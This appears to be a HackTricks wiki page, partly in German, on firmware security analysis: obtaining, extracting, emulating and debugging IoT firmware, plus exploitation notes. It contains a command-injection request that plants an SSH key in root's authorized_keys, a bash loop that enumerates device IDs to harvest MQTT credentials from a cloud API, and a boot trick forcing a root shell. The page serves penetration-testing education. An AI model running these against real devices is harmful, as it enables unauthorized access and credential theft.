# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essenzielle Software, die es Geräten ermöglicht, korrekt zu funktionieren, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software, mit der Nutzer interagieren, verwaltet und erleichtert. Sie wird in permanentem Speicher abgelegt, sodass das Gerät von dem Moment an, in dem es eingeschaltet wird, auf wichtige Anweisungen zugreifen kann, was den Start des Betriebssystems einleitet. Das Untersuchen und potenzielle Modifizieren von Firmware ist ein kritischer Schritt bei der Identifizierung von Sicherheitslücken.

## **Gathering Information**

**Gathering information** ist ein kritischer erster Schritt, um den Aufbau eines Geräts und die von ihm verwendeten Technologien zu verstehen. Dieser Prozess umfasst das Sammeln von Daten zu:

- der CPU-Architektur und dem Betriebssystem, auf dem es läuft
- Bootloader-spezifischen Details
- Hardware-Layout und Datasheets
- Codebase-Metriken und Quellstandorten
- externen Bibliotheken und Lizenztypen
- Update-Historien und regulatorischen Zertifizierungen
- Architektur- und Flussdiagrammen
- Sicherheitsbewertungen und identifizierten Sicherheitslücken

Für diesen Zweck sind **open-source intelligence (OSINT)**-Tools von unschätzbarem Wert, ebenso wie die Analyse aller verfügbaren Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfprozesse. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, die genutzt werden können, um potenzielle Probleme zu finden.

## **Acquiring the Firmware**

Firmware kann auf verschiedene Arten beschafft werden, jede mit ihrem eigenen Grad an Komplexität:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- **Builden** aus bereitgestellten Anweisungen
- **Herunterladen** von offiziellen Support-Seiten
- Nutzung von **Google dork**-Queries zum Finden gehosteter Firmware-Dateien
- Direktes Zugreifen auf **cloud storage** mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Abfangen von **Updates** via man-in-the-middle-Techniken
- **Extrahieren** vom Gerät über Verbindungen wie **UART**, **JTAG** oder **PICit**
- **Sniffing** von Update-Anfragen innerhalb der Gerätekommunikation
- Identifizieren und Verwenden von **hardcoded update endpoints**
- **Dumping** aus dem bootloader oder dem Netzwerk
- **Entfernen und Auslesen** des Speicherchips, wenn alles andere fehlschlägt, unter Verwendung geeigneter Hardware-Tools

### UART-only logs: force a root shell via U-Boot env in flash

Wenn UART RX ignoriert wird (nur Logs), kannst du trotzdem eine init shell erzwingen, indem du das **U-Boot environment blob** offline **editierst**:

1. SPI flash mit einem SOIC-8-Clip + Programmer (3.3V) dumpen:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Die U-Boot-env-Partition lokalisieren, `bootargs` bearbeiten, um `init=/bin/sh` hinzuzufügen, und die **U-Boot env CRC32** für das blob neu berechnen.
3. Nur die env-Partition neu flashen und neu starten; auf UART sollte eine shell erscheinen.

Das ist nützlich auf embedded devices, bei denen die bootloader shell deaktiviert ist, aber die env-Partition über externen Flash-Zugriff beschreibbar ist.

## Analyzing the firmware

Jetzt, da du die **Firmware hast**, musst du Informationen darüber extrahieren, um zu wissen, wie du damit umgehen sollst. Verschiedene Tools, die du dafür verwenden kannst:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Wenn du mit diesen Tools nicht viel findest, prüfe die **entropy** des Images mit `binwalk -E <bin>`. Bei niedriger entropy ist es wahrscheinlich nicht verschlüsselt. Bei hoher entropy ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du diese Tools verwenden, um **files embedded inside the firmware** zu extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), um die Datei zu untersuchen.

### Getting the Filesystem

Mit den vorher genannten Tools wie `binwalk -ev <bin>` solltest du in der Lage gewesen sein, **das Filesystem zu extrahieren**.\
Binwalk extrahiert es normalerweise in einen **Ordner mit dem Namen des Filesystem-Typs**, der meist einer der folgenden ist: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Manchmal hat binwalk **das Magic Byte des Filesystems nicht in seinen Signaturen**. Verwende in diesen Fällen binwalk, um **den Offset des Filesystems zu finden und das komprimierte Filesystem aus der Binärdatei herauszuschneiden** und das Filesystem **manuell zu extrahieren**, abhängig von seinem Typ, anhand der folgenden Schritte.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Führen Sie den folgenden **dd command** aus, um das Squashfs-Dateisystem zu extrahieren.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich danach im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analysieren von Firmware

Sobald die Firmware gewonnen wurde, ist es wichtig, sie zu analysieren, um ihre Struktur und mögliche Schwachstellen zu verstehen. Dieser Prozess umfasst die Nutzung verschiedener Tools, um wertvolle Daten aus dem Firmware-Image zu analysieren und zu extrahieren.

### Erste Analysetools

Für die erste Untersuchung der Binärdatei (bezeichnet als `<bin>`) wird eine Reihe von Befehlen bereitgestellt. Diese Befehle helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren sowie Details zu Partitionen und Dateisystemen zu ermitteln:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **entropy** mit `binwalk -E <bin>` geprüft. Eine niedrige entropy deutet auf fehlende Verschlüsselung hin, während eine hohe entropy auf mögliche Verschlüsselung oder Komprimierung hinweist.

Zum Extrahieren von **embedded files** werden Tools und Ressourcen wie die Dokumentation zu **file-data-carving-recovery-tools** und **binvis.io** zur Dateianalyse empfohlen.

### Extracting the Filesystem

Mit `binwalk -ev <bin>` kann man normalerweise das Filesystem extrahieren, oft in ein Verzeichnis, das nach dem Filesystem-Typ benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** jedoch den Filesystem-Typ wegen fehlender magic bytes nicht erkennt, ist eine manuelle Extraktion notwendig. Dabei wird `binwalk` verwendet, um den Offset des Filesystems zu finden, gefolgt vom `dd`-Befehl, um das Filesystem herauszuschneiden:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um den Inhalt manuell zu extrahieren.

### Filesystem Analysis

Sobald das Filesystem extrahiert ist, beginnt die Suche nach security flaws. Dabei wird auf insecure network daemons, hardcoded credentials, API endpoints, Update-Server-Funktionen, unkompilierten Code, Startup-Skripte und kompilierte Binaries für die Offline-Analyse geachtet.

**Wichtige Orte** und **Elemente**, die geprüft werden sollten, sind:

- **etc/shadow** und **etc/passwd** für Benutzeranmeldeinformationen
- SSL certificates und keys in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle vulnerabilities
- Eingebettete Binaries für weitere Analyse
- Häufige IoT-Device-Webserver und Binaries

Mehrere Tools helfen dabei, sensible Informationen und vulnerabilities innerhalb des Filesystems aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) für die Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware Analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analysis

### Security Checks on Compiled Binaries

Sowohl Quellcode als auch kompilierte Binaries, die im Filesystem gefunden werden, müssen auf vulnerabilities untersucht werden. Tools wie **checksec.sh** für Unix-Binaries und **PESecurity** für Windows-Binaries helfen dabei, ungeschützte Binaries zu identifizieren, die ausgenutzt werden könnten.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Viele IoT Hubs laden ihre gerätespezifische Konfiguration von einem Cloud-Endpoint, der etwa so aussieht:

- `https://<api-host>/pf/<deviceId>/<token>`

Während der Firmware Analysis kann es passieren, dass `<token>` lokal aus der Device ID mittels eines hardcoded secret abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) und als Uppercase-Hex dargestellt

Dieses Design ermöglicht es jedem, der eine deviceId und die STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen, wobei oft plaintext MQTT credentials und Topic-Präfixe offengelegt werden.

Praktischer Ablauf:

1) deviceId aus UART-Boot-Logs extrahieren

- Einen 3.3V UART-Adapter (TX/RX/GND) verbinden und die Logs aufzeichnen:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Suche nach Zeilen, die das cloud config URL-Muster und die Broker-Adresse ausgeben, zum Beispiel:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade Binaries in Ghidra/radare2 und suche nach dem config path ("/pf/") oder MD5 usage.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite den Token in Bash ab und wandle den Digest in Großbuchstaben um:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config und MQTT-Credentials sammeln

- Die URL zusammensetzen und JSON mit curl abrufen; mit jq parsen, um Secrets zu extrahieren:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Missbrauche plaintext MQTT und schwache Topic-ACLs (falls vorhanden)

- Verwende wiederhergestellte Anmeldedaten, um Maintenance-Topics zu abonnieren und nach sensiblen Events zu suchen:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Vorhersehbare Device-IDs enumerieren (in großem Maßstab, mit Autorisierung)

- Viele Ökosysteme betten Vendor OUI/Product/Type-Bytes ein, gefolgt von einem sequenziellen Suffix.
- Du kannst Kandidaten-IDs iterieren, Tokens ableiten und Configs programmgesteuert abrufen:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Hinweise
- Hole immer eine ausdrückliche Autorisierung ein, bevor du eine Massenerkundung versuchst.
- Bevorzuge Emulation oder statische Analyse, um Secrets wiederherzustellen, ohne nach Möglichkeit die Zielhardware zu verändern.


Der Prozess der Emulation von Firmware ermöglicht **dynamische Analyse** entweder des Betriebs eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann auf Herausforderungen durch Hardware- oder Architekturabhängigkeiten stoßen, aber das Übertragen des Root-Dateisystems oder bestimmter Binaries auf ein Gerät mit passender Architektur und Endianness, wie einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine, kann weitere Tests erleichtern.

### Einzelne Binaries emulieren

Für die Untersuchung einzelner Programme ist es entscheidend, die Endianness und die CPU-Architektur des Programms zu identifizieren.

#### Beispiel mit MIPS-Architektur

Um ein Binary mit MIPS-Architektur zu emulieren, kann man den Befehl verwenden:
```bash
file ./squashfs-root/bin/busybox
```
Und um die notwendigen Emulationstools zu installieren:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Für MIPS (big-endian) wird `qemu-mips` verwendet, und für little-endian-Binaries wäre `qemu-mipsel` die Wahl.

#### ARM Architecture Emulation

Für ARM-Binaries ist der Prozess ähnlich, wobei der `qemu-arm`-Emulator für die Emulation verwendet wird.

### Full System Emulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere erleichtern die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

## Dynamic Analysis in Practice

In dieser Phase wird entweder eine echte oder emulierte Geräteumgebung für die Analyse verwendet. Es ist entscheidend, Shell-Zugriff auf das OS und das Dateisystem zu behalten. Emulation bildet Hardware-Interaktionen möglicherweise nicht perfekt ab, sodass gelegentliche Neustarts der Emulation erforderlich sein können. Die Analyse sollte das Dateisystem erneut untersuchen, exponierte Webseiten und Netzwerkdienste ausnutzen und Bootloader-Schwachstellen erkunden. Firmware-Integritätsprüfungen sind entscheidend, um potenzielle Backdoor-Schwachstellen zu identifizieren.

## Runtime Analysis Techniques

Runtime analysis umfasst die Interaktion mit einem Prozess oder Binary in seiner Ausführungsumgebung, wobei Tools wie gdb-multiarch, Frida und Ghidra verwendet werden, um Breakpoints zu setzen und Schwachstellen durch fuzzing und andere Techniken zu identifizieren.

Für eingebettete Ziele ohne vollständigen Debugger: **kopiere ein statisch gelinktes `gdbserver`** auf das Gerät und verbinde dich remote:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Auf IoT-Hubs ist der RF-Stack oft zwischen einem **radio MCU** und einem Linux-Userland-Prozess aufgeteilt. Ein nützlicher Workflow ist es, den Pfad zuzuordnen:

1. **RF frame** in der Luft
2. **controller-side parser** auf dem radio MCU
3. **serial/UART text or TLV protocol** weitergeleitet an Linux (zum Beispiel `/dev/tty*`)
4. **application dispatcher** im Haupt-Daemon
5. **protocol-specific handler / state machine**

Diese Architektur schafft zwei Reversing-Ziele statt eines. Wenn der Controller binäre radio frames in ein textuelles Protokoll wie `Group,Command,arg1,arg2,...` umwandelt, rekonstruiere:

- Die **message groups** und Dispatch-Tabellen
- Welche Messages aus dem **network** versus vom Controller selbst kommen können
- Die genauen **manufacturer-specific discriminator fields** (zum Beispiel Zigbee `manufacturer_code` und custom `cluster_command`)
- Welche Handler nur während **commissioning**, Discovery oder firmware/model download-Phasen erreichbar sind

Speziell für Zigbee: Erfasse Pairing-Traffic und prüfe, ob das Ziel noch den Default-**Link Key** `ZigBeeAlliance09` verwendet. Falls ja, kann das Mitschneiden von Commissioning-Traffic den **Network Key** offenlegen. Zigbee 3.0 install codes reduzieren diese Angriffsfläche, also notiere, ob das getestete Gerät sie tatsächlich erzwingt.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-spezifische Zigbee/ZCL-Commands sind oft ein besseres Ziel als standardisierte Clusters, weil sie **custom parsing code** und interne **FSMs** mit weniger kampferprobter Validierung speisen.

Praktischer Workflow:

- Reverse den Command-Dispatcher, bis du den **vendor-only handler** findest.
- Rekonstruiere die **FSM state**, **event**, **check**, **action** und **next-state**-Tabellen.
- Identifiziere **transitional states**, die automatisch weiterschalten, sowie retry/error branches, die letztlich attacker-controlled state zurücksetzen oder freigeben.
- Bestätige, welche legitimen Protocol-Exchanges nötig sind, um den Daemon in den verwundbaren Zustand zu bringen, statt anzunehmen, dass der fehlerhafte Handler immer erreichbar ist.

Bei timing-sensitiven Protokollen kann Packet-Replay aus einem Python-Framework zu langsam sein. Ein zuverlässigerer Ansatz ist es, ein legitimes Gerät auf echter Hardware zu emulieren (zum Beispiel ein **nRF52840**) mit einem Stack in Vendor-Qualität, damit du die richtigen **endpoints**, **attributes** und das Commissioning-Timing auslösen kannst.

### Fragmented-download bug class in embedded daemons

Eine wiederkehrende Firmware-Bugklasse tritt bei **fragmented blob/model/configuration downloads** auf:

1. Der **erste fragment** (`offset == 0`) speichert `ctx->total_size` und allokiert `malloc(total_size)`.
2. Spätere Fragmente validieren nur die attacker-controlled **packet-local** Felder wie `packet_total_size >= offset + chunk_len`.
3. Der Copy-Vorgang nutzt `memcpy(&ctx->buffer[offset], chunk, chunk_len)` ohne gegen die **original allocated size** zu prüfen.

Das erlaubt einem Angreifer, Folgendes zu senden:

- Ein erstes gültiges Fragment mit einer **kleinen** angegebenen Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten offset**, aber einem größeren `chunk_len`.
- Eine gefälschte packet-local size, die die frischen Checks erfüllt, aber den ursprünglich allokierten Buffer trotzdem überläuft.

Wenn der verwundbare Pfad hinter Commissioning-Logik liegt, muss die Exploitation genug **device emulation** enthalten, um das Ziel in den erwarteten model-download oder blob-download state zu bringen, bevor die fehlerhaften Fragmente gesendet werden.

### Protocol-driven `free()` triggers

In embedded daemons ist der einfachste Weg, Heap-Metadata-Exploitation auszulösen, oft nicht "auf cleanup warten", sondern **das Error Handling des Protokolls selbst erzwingen**:

- Sende fehlerhafte Folgefragmente, um die FSM in **retry**- oder **error**-States zu drängen.
- Überschreite den Retry-Threshold, sodass der Daemon den **context reset** und den beschädigten Buffer freigibt.
- Nutze dieses vorhersehbare `free()`, um allocator-side Primitives auszulösen, bevor der Prozess aus anderen Gründen crasht.

Das ist besonders nützlich gegen **musl/uClibc/dlmalloc-like** Allocators in Embedded Linux, bei denen das Korruptieren von Chunk-Metadaten unlink/unbin logic in eine write primitive verwandeln kann. Ein stabiles Muster ist es, ein **size field** zu korrumpieren, um den Allocator-Traversal in **fake chunks staged inside the overflowed buffer** umzuleiten, statt sofort reale bin pointers zu überschreiben und den Prozess abzustürzen.

## Binary Exploitation and Proof-of-Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und das Programmieren in Low-Level-Sprachen. Binary-Runtime-Schutzmechanismen sind in Embedded-Systemen selten, aber wenn sie vorhanden sind, können Techniken wie Return Oriented Programming (ROP) nötig sein.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc verwendet fastbins ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen, daher muss jeder fake chunk die Checks überstehen (plausible size, `fd = 0` und umgebende Chunks müssen als "in use" erscheinen).
- **Non-PIE binaries under ASLR:** wenn ASLR aktiviert ist, aber das Hauptbinary **non-PIE** ist, bleiben `.data/.bss`-Adressen im Binary stabil. Du kannst einen Bereich anvisieren, der bereits wie ein gültiger heap chunk header aussieht, um eine fastbin allocation auf einer **function pointer table** zu landen.
- **Parser-stopping NUL:** wenn JSON geparst wird, kann ein `\x00` im Payload das Parsing stoppen, während nachfolgende attacker-controlled bytes für einen stack pivot/ROP chain erhalten bleiben.
- **Shellcode via `/proc/self/mem`:** eine ROP chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in eine bekannte Mapping schreiben und dorthin springen.

## Prepared Operating Systems for Firmware Analysis

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests, ausgestattet mit den nötigen Tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die dir helfen soll, Security Assessment und penetration testing von Internet of Things (IoT)-Geräten durchzuführen. Sie spart dir viel Zeit, indem sie eine vorkonfigurierte Umgebung mit allen notwendigen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system basierend auf Ubuntu 18.04, vorinstalliert mit Firmware-Sicherheitstest-Tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird **version rollback (downgrade) protection** häufig weggelassen. Wenn der Boot- oder Recovery-Loader nur die Signatur mit einem eingebetteten öffentlichen Schlüssel prüft, aber die *Version* (oder einen monotonen Zähler) des zu flashenden Images nicht vergleicht, kann ein Angreifer legitim eine **ältere, verwundbare Firmware installieren, die weiterhin eine gültige Signatur trägt**, und so behobene Schwachstellen erneut einführen.

Typischer Angriff workflow:

1. **Ein älteres signiertes Image beschaffen**
* Vom öffentlichen Download-Portal, CDN oder Support-Portal des Herstellers holen.
* Aus begleitenden Mobile-/Desktop-Apps extrahieren (z. B. in einem Android APK unter `assets/firmware/`).
* Aus Drittanbieter-Repositories wie VirusTotal, Internetarchiven, Foren usw. beziehen.
2. **Das Image hochladen oder dem Gerät bereitstellen** über einen exponierten Update-Channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Viele Consumer-IoT-Geräte exponieren *unauthenticated* HTTP(S)-Endpunkte, die Base64-codierte Firmware blobs akzeptieren, serverseitig dekodieren und recovery/upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in der neueren Version gepatcht wurde (zum Beispiel ein Command-Injection-Filter, der später hinzugefügt wurde).
4. Optional das neueste Image wieder flashen oder Updates deaktivieren, um Entdeckung zu vermeiden, sobald Persistenz erreicht wurde.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In der verwundbaren (downgraded) Firmware wird der `md5`-Parameter direkt in einen Shell-Befehl ohne Sanitization verkettet, was die Injection beliebiger Commands ermöglicht (hier – Aktivierung von SSH key-based root access). Spätere Firmware-Versionen führten einen einfachen Character Filter ein, aber das Fehlen von downgrade protection macht den Fix wirkungslos.

### Extracting Firmware From Mobile Apps

Viele Anbieter bündeln komplette Firmware Images in ihren Companion Mobile Applications, damit die App das Gerät über Bluetooth/Wi-Fi updaten kann. Diese Pakete werden häufig unverschlüsselt in der APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Tools wie `apktool`, `ghidra` oder sogar einfaches `unzip` ermöglichen es dir, signierte Images zu extrahieren, ohne die physische Hardware anzufassen.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checkliste zur Bewertung der Update-Logik

* Ist der Transport/die Authentifizierung des *update endpoint* ausreichend geschützt (TLS + Authentication)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Counter**?
* Wird das Image innerhalb einer Secure-Boot-Chain verifiziert (z. B. Signaturen, die vom ROM-Code geprüft werden)?
* Führt Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. erlaubte Partition Map, Model Number)?
* Verwenden *partial* oder *backup* Update-Flows dieselbe Validierungslogik erneut?

> 💡  Wenn eines der oben genannten Elemente fehlt, ist die Plattform wahrscheinlich anfällig für Rollback attacks.

## Vulnerable firmware to practice

Um das Aufspüren von Schwachstellen in Firmware zu üben, verwende die folgenden vulnerable firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
